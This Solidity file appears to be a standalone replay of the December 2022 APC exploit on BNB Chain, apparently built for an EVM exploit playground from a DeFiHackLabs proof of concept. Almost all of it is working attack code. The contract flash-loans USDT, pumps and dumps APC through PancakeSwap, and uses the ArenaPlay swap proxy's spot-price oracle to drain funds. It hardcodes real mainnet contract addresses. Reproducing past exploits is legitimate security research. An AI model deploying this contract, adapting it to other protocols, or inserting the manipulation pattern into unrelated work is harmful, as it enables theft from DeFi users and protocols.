// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-APC).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the DODO flash-loan callback `DPPFlashLoanCall` lives on the test
// itself (`assetTo = address(this)`), so there is no standalone contract to
// deploy. This file is a faithful, self-contained copy of that inline attack
// (testExploit body → run(); DPPFlashLoanCall callback + helpers inlined),
// compiled inside the registry forge project. Logic and constants are copied
// verbatim from test/APC_exp.sol.
//
// Root cause: the ArenaPlay project's internal `swap()` (behind a transparent
// upgradeable proxy at 0x5a88…) prices each leg off a SPOT PancakeSwap
// `getAmountOut(getReserves())` read on the APC/USDT pair — an oracle with no
// TWAP / no freshness check / no slippage guard. Pumping APC with a flash-loaned
// war chest, settling the project swap, then dumping APC lets the attacker buy
// APC back cheaper than it just sold it, in the SAME transaction. The PoC nets
// ~7,626.99 USDT in one cycle.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface ITransparentSwap {
    function swap(address from, address to, uint256 amount) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract APCSpotOracleDrain {
    // --- victims / constants (copied verbatim from test/APC_exp.sol) -----------
    address constant APC = 0x2AA504586d6CaB3C59Fa629f74c586d78b93A025;
    address constant MUSD = 0x473C33C55bE10bB53D81fe45173fcc444143a13e;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant TRANS_SWAP = 0x5a88114F02bfFb04a9A13a776f592547B3080237;
    address constant DODO = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    uint256 constant FLASH_AMOUNT = 500_000 * 1e18; // 500,000 USDT (18 decimals on BSC)

    IERC20 constant apc = IERC20(APC);
    IERC20 constant musd = IERC20(MUSD);
    IERC20 constant usdt = IERC20(USDT);

    // step 0: approvals + flash-loan 500,000 USDT from the DODO DVM/DPP pool.
    // The callback below pumps/settles/dumps/settles/liquidates, then repays.
    function run() external {
        apc.approve(ROUTER, type(uint256).max);
        apc.approve(TRANS_SWAP, type(uint256).max);
        usdt.approve(ROUTER, type(uint256).max);
        musd.approve(TRANS_SWAP, type(uint256).max);
        IDVM(DODO).flashLoan(0, FLASH_AMOUNT, address(this), new bytes(1));
    }

    // DODO V2 flash-loan callback. The pool optimistically sent 500k USDT; here
    // the attacker pumps APC's spot price, settles the project swap at the
    // inflated rate, dumps APC, settles back at the deflated rate, liquidates,
    // and repays the flash loan. Profit stays in this contract as USDT.
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        usdtToApc(); // Pump APC token price
        // Project swap reads the now-inflated spot price → overpays in MUSD.
        ITransparentSwap(TRANS_SWAP).swap(APC, MUSD, 100_000 * 1e18);
        apcToUsdt(); // Dump APC token price
        // Project swap reads the now-deflated spot price → returns more APC.
        ITransparentSwap(TRANS_SWAP).swap(MUSD, APC, musd.balanceOf(address(this)));
        apcToUsdt(); // sell the obtained APC
        usdt.transfer(DODO, FLASH_AMOUNT); // repay flash loan (fee-free)
    }

    function usdtToApc() internal {
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = APC;
        IUniswapV2Router02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdt.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function apcToUsdt() internal {
        address[] memory path = new address[](2);
        path[0] = APC;
        path[1] = USDT;
        IUniswapV2Router02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            apc.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
